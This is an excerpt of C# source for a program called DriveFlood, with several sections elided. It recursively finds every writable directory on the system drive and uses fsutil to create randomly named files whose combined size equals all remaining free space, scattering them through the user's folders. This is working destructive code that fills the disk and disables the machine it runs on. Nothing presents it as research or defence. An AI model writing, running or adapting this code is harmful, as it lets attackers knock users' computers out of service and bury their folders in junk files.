/*
 * Spreads random files in the user folders
 */
...
namespace DriveFlood
{
    internal class Program
    {
        private static Random rng = new Random();
        private static List<string> TestDirs = new List<string>() // Visual studio auto compelted this for me B-)
        {
        ...
        private static void FindWritableDirectories(string path, List<string> directories) // Index a directory's writable sub directories
        {
            if (CanAccessDirectory(path) && !directories.Contains(path))
                directories.Add(path);

            foreach (string dir in SafeGetDirectories(path))
            {
                if (CanAccessDirectory(dir) && !directories.Contains(dir))
                    directories.Add(dir);

                FindWritableDirectories(dir, directories);
            }
        }
        ...
        static void Main(string[] args)
        {
            ...
            {
                if (!d.IsReady || !d.Name.Equals(system)) continue;

                string wPath = string.Empty;

                foreach (string s in TestDirs)
                {
                ...
                if (wPath.Equals(string.Empty)) wPath = FindWritableDirectory(d.Name);

                List<string> directories = new List<string>();
                FindWritableDirectories(wPath, directories);

                long size = d.TotalFreeSpace / directories.Count;

                foreach (string dir in directories)
                {
                    try
                    {
                        string file = dir + "\\" + GenerateNumbers();

                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = "fsutil.exe";
                        psi.Arguments = "file createnew \"" + file + "\" " + size; // fsutil file createnew (filename) (sizeinbytes)
